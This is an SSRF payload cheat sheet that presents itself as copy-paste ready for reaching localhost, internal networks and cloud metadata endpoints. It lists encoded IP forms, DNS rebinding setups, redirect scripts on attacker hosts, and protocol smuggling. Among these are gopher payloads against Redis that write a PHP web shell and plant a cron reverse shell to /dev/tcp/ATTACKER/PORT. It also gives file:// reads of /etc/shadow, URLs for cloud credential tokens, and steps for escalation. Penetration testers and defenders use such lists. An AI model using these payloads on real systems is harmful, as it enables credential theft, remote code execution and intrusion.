# SSRF Bypass Techniques & Payloads

> Copy-paste ready SSRF bypass payloads for testing server-side request forgery vulnerabilities.
> Target: access internal services (127.0.0.1, metadata endpoints, internal networks).

---

## IP Address Bypasses

### Localhost Representations

#### Decimal / Integer
```
http://2130706433          (127.0.0.1 as 32-bit integer)
http://2130706433:80
http://2130706433/admin
http://017700000001        (127.0.0.1 as octal integer)
http://3232235521          (192.168.0.1 as integer)
http://3232235777          (192.168.1.1 as integer)
http://2852039166          (169.254.169.254 as integer)
```

#### Octal
```
http://0177.0000.0000.0001
http://0177.0.0.1
http://0177.1
http://00177.00000.00000.00001
http://0177.0000.0000.0001:80/
http://0300.0250.0251.0376    (192.168.169.254 in octal)
```

#### Hexadecimal
```
http://0x7f000001
http://0x7f.0x0.0x0.0x1
http://0x7f000001:80
http://0x7f.0x00.0x00.0x01
http://0x7F000001/admin
http://0xc0a80001            (192.168.0.1)
http://0xa9fea9fe            (169.254.169.254)
```

#### Mixed Notation
```
http://0x7f.0.0.1
http://0177.0.0.0x1
http://127.0x0.0x0.1
http://0x7f.0.0.01
http://127.0.0.0x01
http://0177.0x00.0x00.0x01
```

#### IPv6
```
http://[::1]
http://[::1]:80
http://[::1]/admin
http://[0000::1]
http://[::ffff:127.0.0.1]
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0:0:0:0:0:0:0:1]
http://[::1%25]
http://[::1%2500]
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:a9fe:a9fe]
```

#### IPv4-mapped IPv6
```
http://[::ffff:127.0.0.1]
http://[::ffff:127.0.0.1]:80/admin
http://[::ffff:a]        → 0.0.0.10
http://[::ffff:0x7f000001]
http://[v1.7f000001]
```

#### Enclosed Alphanumeric (Unicode)
```
http://①②⑦.⓪.⓪.①
http://⑯⑨.②⑤④.⑯⑨.②⑤④
```

#### Special Addresses
```
http://127.1
http://127.0.1
http://127.000.000.001
http://127.127.127.127
http://0.0.0.0
http://0
http://localhost
http://LOCALHOST
http://lOcAlHoSt
http://localtest.me
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net
http://customer1.app.localhost
```

### Internal Network Ranges
```
http://10.0.0.1
http://10.0.0.0/8
http://172.16.0.1
http://172.16.0.0/12
http://192.168.0.1
http://192.168.0.0/16
http://169.254.169.254
```

---

## DNS Rebinding

### Concept
First DNS query resolves to allowed IP, second resolves to internal IP (127.0.0.1).

### Services
```
http://1u.ms/              (configure A record to flip)
http://lock.cmpxchg8b.com  (resolves 127.0.0.1)
http://A.62.account.rbndr.us/  (alternates between A records)
http://make-127-0-0-1-rr.1u.ms
http://7f000001.rr.1u.ms
http://rbndr.us/dnsrebind
```

### Custom Setup
```
; DNS zone file - first response
ssrf.attacker.com.  1  IN  A  1.2.3.4   ; allowed external IP

; DNS zone file - second response (after TTL expires)
ssrf.attacker.com.  0  IN  A  127.0.0.1  ; internal target
```

### Rebinding Payload
```
http://ssrf-rebind.attacker.com/internal-endpoint
```

### DNS Pinning Bypass
```
Set TTL=0 on DNS records
Use multiple A records (some resolve to internal, some external)
Race condition: make request during DNS re-resolution window
```

---

## Redirect-Based Bypasses

### 301/302 Redirect
Host a redirect on attacker server that points to internal resource:
```
# attacker.com/redirect.php
<?php header("Location: http://127.0.0.1/admin"); ?>

# attacker.com/redirect.py (Flask)
@app.route('/redir')
def redir():
    return redirect("http://169.254.169.254/latest/meta-data/")

# Short URLs
http://attacker.com/r → 302 → http://127.0.0.1:8080/admin
http://bit.ly/xyz     → 302 → http://internal-host/secret
```

### Payloads
```
http://attacker.com/redirect?url=http://127.0.0.1/admin
http://attacker.com/302.php?target=http://169.254.169.254/latest/meta-data/
http://attacker.com/meta.php  (redirects to cloud metadata)
```

### Meta Refresh / JavaScript Redirect
```html
<!-- attacker.com/meta.html -->
<meta http-equiv="refresh" content="0;url=http://127.0.0.1/admin">

<!-- JavaScript-based (if rendered) -->
<script>window.location='http://127.0.0.1/admin'</script>
```

### Redirect Chain
```
http://attacker.com/1  → 302 → http://attacker.com/2  → 302 → http://127.0.0.1/admin
```

---

## Protocol Smuggling

### Gopher
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp%20system($_GET['cmd'])%3b%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:<evil@attacker.com>%0d%0aRCPT%20TO:<admin@victim.com>%0d%0aDATA%0d%0aSubject:%20pwned%0d%0a%0d%0aYou%20are%20hacked%0d%0a.%0d%0aQUIT

gopher://127.0.0.1:3306/_<mysql_packet_data>

gopher://127.0.0.1:11211/_set%20ssrf_key%200%20100%2010%0d%0ahacked_val%0d%0a

gopher://127.0.0.1:6379/_INFO%0d%0a
```

#### Gopher to Redis — Reverse Shell
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0acron%0d%0a$58%0d%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/PORT 0>&1%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Dict Protocol
```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/CONFIG SET dir /var/www/html
dict://127.0.0.1:6379/CONFIG SET dbfilename shell.php
dict://127.0.0.1:6379/SET:x:<?php system($_GET['c']);?>
dict://127.0.0.1:6379/SAVE
dict://127.0.0.1:11211/stats
```

### File Protocol
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///proc/net/fib_trie
file:///var/www/html/config.php
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file://127.0.0.1/etc/passwd
file://localhost/etc/passwd
```

### FTP Protocol
```
ftp://127.0.0.1/
ftp://anonymous:anonymous@127.0.0.1/
ftp://127.0.0.1:21/etc/passwd
```

### TFTP
```
tftp://127.0.0.1:69/testfile
```

### LDAP
```
ldap://127.0.0.1:389/%0astats%0aquit
ldap://127.0.0.1/dc=example,dc=com
```

### Jar Protocol (Java)
```
jar:http://attacker.com/evil.jar!/payload.class
jar:https://attacker.com/evil.jar!/
```

---

## Cloud Metadata Endpoints

### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

### AWS (IMDSv2 — Token Required)
```
# Step 1: Get token
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/

# SSRF bypass for IMDSv2: If the app follows redirects with headers
http://attacker.com/redirect  → 302 to http://169.254.169.254/latest/api/token (PUT)
```

### AWS ECS
```
http://169.254.170.2/v2/credentials/GUID
http://169.254.170.2/v2/metadata
```

### AWS Lambda
```
http://localhost:9001/2018-06-01/runtime/invocation/next
```

### GCP (Google Cloud)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

**Note:** GCP requires header `Metadata-Flavor: Google` — bypass via redirect from your server that adds the header, or CRLF injection.

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```

**Note:** Azure requires header `Metadata: true` — similar bypass via redirect + header injection.

### Azure App Service
```
http://169.254.130.1/metadata/v1/InstanceInfo
http://169.254.130.1/metadata/v1/Health
```

### Alibaba Cloud (Chinese Cloud)
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/hostname
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
http://100.100.100.200/latest/user-data
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/
http://169.254.169.254/metadata/v1/user-data
```

### Oracle Cloud
```
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v2/instance/
```

### Kubernetes
```
https://kubernetes.default.svc/
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets
https://kubernetes.default.svc/api/v1/pods
http://127.0.0.1:10250/pods
http://127.0.0.1:10255/pods
http://127.0.0.1:10255/metrics
http://127.0.0.1:2379/v2/keys/
```

---

## URL Parsing Differentials

### Userinfo (@ symbol)
```
http://attacker.com@127.0.0.1
http://attacker.com:anything@127.0.0.1
http://127.0.0.1%23@attacker.com          (# encoded)
http://127.0.0.1%2523@attacker.com        (double-encoded #)
http://attacker.com#@127.0.0.1            (fragment before @)
http://evil$@127.0.0.1                    (special chars before @)
```

### Backslash Confusion
```
http://attacker.com\@127.0.0.1
http://127.0.0.1\attacker.com
http://127.0.0.1\.attacker.com
```

### Fragment (#) Confusion
```
http://127.0.0.1#.attacker.com
http://attacker.com%23.127.0.0.1
http://127.0.0.1%23attacker.com
```

### Double URL Encoding
```
http://127.0.0.1  → http://%31%32%37%2e%30%2e%30%2e%31
                  → http://%2531%2532%2537%252e%2530%252e%2530%252e%2531
http://169.254.169.254 → %31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
```

### Unicode/Punycode
```
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ
http://ⓁⓄⒸⒶⓁⒽⓄⓈⓉ
http://ⒶⓌⓢ.attacker.com  → could resolve to internal
```

### Port Manipulation
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:0
http://127.0.0.1:65535
http://[::1]:80
http://127.0.0.1:80%0d%0aHost:%20internal-host
```

### Schema Variations
```
HTTP://127.0.0.1
hTtP://127.0.0.1
Http://127.0.0.1
//127.0.0.1
\/\/127.0.0.1
```

### Path Confusion
```
http://attacker.com/..;/..;/internal
http://attacker.com/..%252f..%252f/internal
http://attacker.com/%2e%2e/internal
```

---

## Filter Bypass Combinations

### Domain Allowlist Bypasses
```
http://allowed-domain.attacker.com          (subdomain of attacker)
http://alloweddomain.attacker.com           (no dot separator)
http://attacker.com/allowed-domain.com      (in path)
http://allowed-domain.com@attacker.com      (userinfo)
http://attacker.com#allowed-domain.com      (fragment)
http://allowed-domain.com.attacker.com      (subdomain)
```

### Extension/Content-Type Bypasses
```
http://127.0.0.1/admin.jpg
http://127.0.0.1/admin%00.jpg
http://127.0.0.1/admin#.jpg
http://127.0.0.1/admin?.jpg
http://127.0.0.1/admin;.jpg
```

### CRLF Injection for Header Manipulation
```
http://127.0.0.1/%0d%0aHost:%20internal%0d%0a
http://attacker.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a
http://169.254.169.254/%0d%0aMetadata-Flavor:%20Google%0d%0a
```

### Combining Techniques
```
# Octal + Port
http://0177.0.0.1:8080/admin

# IPv6 + encoded
http://[::ffff:127.0.0.1]:80/admin

# Integer + redirect
http://attacker.com/redir?url=http://2130706433/admin

# DNS rebind + cloud metadata
http://rebind-169.254.169.254.attacker.com/latest/meta-data/

# Gopher + Redis on localhost
gopher://0177.0.0.1:6379/_INFO%0d%0a

# Double encode + special IP
http://%32%31%33%30%37%30%36%34%33%33/admin

# Fragment confusion + metadata
http://169.254.169.254%23.allowed.com/latest/meta-data/

# Enclosed alphanumeric + path
http://①②⑦.⓪.⓪.①/admin
```

---

## Common Internal Services to Target

### Service Discovery
```
http://127.0.0.1:22        (SSH)
http://127.0.0.1:25        (SMTP)
http://127.0.0.1:80        (HTTP)
http://127.0.0.1:443       (HTTPS)
http://127.0.0.1:3000      (Grafana/Node)
http://127.0.0.1:3306      (MySQL)
http://127.0.0.1:5432      (PostgreSQL)
http://127.0.0.1:5672      (RabbitMQ)
http://127.0.0.1:6379      (Redis)
http://127.0.0.1:8080      (Tomcat/Jenkins)
http://127.0.0.1:8443      (HTTPS alt)
http://127.0.0.1:8500      (Consul)
http://127.0.0.1:8888      (Jupyter)
http://127.0.0.1:9000      (PHP-FPM/SonarQube)
http://127.0.0.1:9090      (Prometheus)
http://127.0.0.1:9200      (Elasticsearch)
http://127.0.0.1:11211     (Memcached)
http://127.0.0.1:15672     (RabbitMQ Management)
http://127.0.0.1:27017     (MongoDB)
```

### Cloud-Specific Internal Endpoints
```
# AWS internal
http://127.0.0.1:51678/v1/metadata  (ECS agent)
http://127.0.0.1:2375               (Docker API)
http://127.0.0.1:2376               (Docker API TLS)

# Kubernetes internal
http://127.0.0.1:10250/pods         (Kubelet API)
http://127.0.0.1:10255/healthz      (Kubelet read-only)
http://127.0.0.1:8001               (kubectl proxy)
http://127.0.0.1:6443               (API server)
http://127.0.0.1:4194               (cAdvisor)
```

---

## Testing Methodology

### Step 1: Identify SSRF Injection Points
```
URL parameters: ?url=, ?link=, ?src=, ?dest=, ?redirect=, ?uri=, ?path=, ?img=
File fetching: PDF generators, webhooks, import functions, avatar upload by URL
API integrations: Webhook URLs, callback URLs, notification endpoints
```

### Step 2: Confirm Outbound Request
```
Use Burp Collaborator, interact.sh, or webhook.site
http://YOUR_COLLAB_DOMAIN/ssrf-test
```

### Step 3: Test Basic Internal Access
```
http://127.0.0.1/
http://localhost/
http://[::1]/
```

### Step 4: Apply Bypass Techniques
If basic access is blocked, iterate through:
1. IP encoding (decimal, octal, hex, IPv6)
2. DNS names that resolve to 127.0.0.1
3. Redirect-based bypass
4. Protocol switching (file://, gopher://)
5. URL parsing tricks (@, #, double encoding)
6. DNS rebinding

### Step 5: Escalate
```
Read cloud metadata credentials
Access internal APIs/admin panels
Pivot to internal network scanning
Chain with other vulnerabilities (CSRF, XSS)
```
